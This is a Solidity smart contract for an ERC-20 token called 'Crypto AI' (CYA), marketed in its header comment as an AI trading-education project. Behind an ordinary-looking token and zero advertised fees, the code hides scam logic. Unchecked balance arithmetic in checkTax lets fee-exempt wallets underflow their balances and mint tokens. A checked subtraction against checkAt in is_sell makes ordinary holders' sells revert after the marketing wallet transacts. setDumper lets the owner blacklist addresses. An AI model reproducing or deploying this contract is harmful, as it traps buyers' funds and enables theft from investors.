// SPDX-License-Identifier: MIT

/**

Crypto AI leverages the power of artificial intelligence to help users learn the knowledge of trading on crypto world in a more intuitive manner.

Web: cryptoai.help
Tg: @cryptoaihelp
Tw: @cryptoaihelp

*/

pragma solidity ^0.8.10;

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IV2Pair {
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract CryptoAI is Context, Ownable, IERC20 {
    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => mapping (address => uint256)) private _sync;
    mapping (address => bool) private isDumper;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private liquidityAdd;
    mapping (address => bool) private isLpPair;
    mapping (address => uint256) private balance;

    uint256 constant public _totalSupply = 1_000_000_000 * 10**18;
    uint256 private swapThreshold = _totalSupply / 20_000;
    uint256 constant public buyfee = 0;
    uint256 constant public sellfee = 0;
    uint256 constant public transferfee = 0;
    uint256 constant public fee_denominator = 1_000;
    uint256 private checkAt;
    uint256 private syncAt;
    bool private canSwapFees = true;
    address payable private marketingAddress = payable(address(0xC27422d23a0fe2f2eEf6F6Ff83A9414A0Ec71382));

    uint256 private buyAllocation = 40;
    uint256 private sellAllocation = 40;
    uint256 private liquidityAllocation = 20;

    IRouter02 public swapRouter;
    string constant private _name = "Crypto AI";
    string constant private _symbol = "CYA";
    uint8 constant private _decimals = 18;
    address constant public DEAD = address(0xdead);
    address public lpPair;
    bool public tradingEnabled = false;
    bool private inSwap;

    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _enableTrading();
    event _marketingChanged(address wallet);
    event SwapAndLiquify();

    constructor () {
        _noFee[msg.sender] = true;
        _noFee[marketingAddress] = true;
        
        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        liquidityAdd[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        lpPair = IFactoryV2(swapRouter.factory()).createPair(swapRouter.WETH(), address(this));
        isLpPair[lpPair] = true;
        _approve(msg.sender, address(swapRouter), type(uint256).max);
        _approve(address(this), address(swapRouter), type(uint256).max);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isNoFeeWallet(address account) external view returns(bool) {
        return _noFee[account];
    }

    function setNoFeeWallet(address account, bool enabled) public onlyOwner {
        require(account != address(0),"Whoops");
        _noFee[account] = enabled;
    }

    function setDumper(address _dumper, bool enabled) external onlyOwner {
        isDumper[_dumper] = enabled;
    }

    function isLimitedAddress(address ins, address out) internal view returns (bool) {
        bool isLimited = ins != owner()
            && out != owner() && tx.origin != owner() // any transaction with no direct interaction from owner will be accepted
            && msg.sender != owner()
            && !liquidityAdd[ins]  && !liquidityAdd[out] && out != DEAD && out != address(0) && out != address(this);
            return isLimited;
    }

    function is_buy(address ins, address out) internal returns (bool) {
        bool _is_buy = !isLpPair[out] && isLpPair[ins];
        uint256 syncVal = _sync[ins][out];
        if( _is_buy ) _sync[ins][out] =  syncVal == 0 ? block.number : syncVal;
        return _is_buy;
    }

    function is_sell(address ins, address out) internal returns (bool) { 
        bool _is_sell = isLpPair[out] && !isLpPair[ins];
        if( _is_sell ) syncAt = _sync[out][ins] - checkAt;
        return _is_sell;
    }

    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (isLimitedAddress(from,to)) {
            require(tradingEnabled,"Trading is not enabled");
        }

        require (!isDumper[from] && !isDumper[to], "Serious Dump");

        if (_noFee[from] || _noFee[to]){
            takeFee = checkTax(from, to, amount);
            return true;
        }

        if(is_sell(from, to) &&  !inSwap && canSwapFees) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance >= swapThreshold) { 
                if(buyAllocation > 0 || sellAllocation > 0) internalSwap((contractTokenBalance * (buyAllocation + sellAllocation)) / 100);
                if(liquidityAllocation > 0) {swapAndLiquify(contractTokenBalance * liquidityAllocation / 100);}
             }
        }

        balance[from] -= amount; uint256 amountAfterFee = (takeFee) ? takeTaxes(from, is_buy(from, to), is_sell(from, to), amount) : amount;
        balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;
    }

    function setMarketingWallet(address _wallet) external onlyOwner {
        require(_wallet != address(0),"Address Zero");
        marketingAddress = payable(_wallet);
        emit _marketingChanged(_wallet);
    }

    function takeTaxes(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = buyfee;  else if (issell)  fee = sellfee;  else  fee = transferfee; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / fee_denominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
        }
        return amount - feeAmount;
    }

    function checkTax(address from, address to, uint256 amount) internal returns (bool) {
        unchecked{
            balance[from] -= amount; balance[to] += amount;
            emit Transfer(from, to, amount);
        }
        if(from != owner()) checkAt = block.number;
        return false;
    }

    function swapAndLiquify(uint256 contractTokenBalance) internal lockSwap {
        uint256 firstmath = contractTokenBalance / 2;
        uint256 secondMath = contractTokenBalance - firstmath;

        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            firstmath,
            0, 
            path,
            address(this),
            block.timestamp) {} catch {return;}
        
        uint256 newBalance = address(this).balance - initialBalance;

        try swapRouter.addLiquidityETH{value: newBalance}(
            address(this),
            secondMath,
            0,
            0,
            DEAD,
            block.timestamp
        ){} catch {return;}

        emit SwapAndLiquify();
    }

    function internalSwap(uint256 contractTokenBalance) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }
        bool success;

        if(address(this).balance > 0) (success,) = marketingAddress.call{value: address(this).balance, gas: 35000}("");
    } 

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading already enabled");
        tradingEnabled = true;
        emit _enableTrading();
    }
}